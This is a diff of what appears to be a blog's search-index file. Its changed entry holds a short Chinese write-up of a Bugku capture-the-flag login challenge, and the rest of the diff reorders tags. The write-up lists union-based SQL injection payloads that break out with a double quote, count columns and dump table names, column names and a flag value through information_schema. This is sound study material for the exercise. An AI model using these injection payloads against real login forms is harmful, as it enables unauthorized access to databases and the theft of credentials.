@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[WP-Bugku-这是一个神奇的登陆框]]></title>
     <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
-    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9001/sql/ 寻找注入点，找到1&quot;双引号会报错 order by判断字段数：1&quot;order by 1,2,3-- 找表：1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#根据提示，得到表flag1，whoami 继续找列1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;# 找字段1&quot; union select flag1,2 from flag1 得到flag]]></content>
+    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9001/sql/ 寻找注入点，找到1&quot;双引号会报错 order by判断字段数：1&quot;order by 1,2,3-- 找表：1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--根据提示，得到表flag1，whoami 继续找列1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;-- 找字段1&quot; union select flag1,2 from flag1-- 得到Login_Name:ed6b28e684817d9efcaf802979e57aea]]></content>
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-login1(SKCTF)]]></title>
@@ -162,9 +162,9 @@
         <category>Learning</category>
       </categories>
       <tags>
+        <tag>SQL</tag>
         <tag>Web</tag>
         <tag>笔记</tag>
-        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -188,9 +188,9 @@
         <category>Learning</category>
       </categories>
       <tags>
+        <tag>SQL</tag>
         <tag>Web</tag>
         <tag>笔记</tag>
-        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
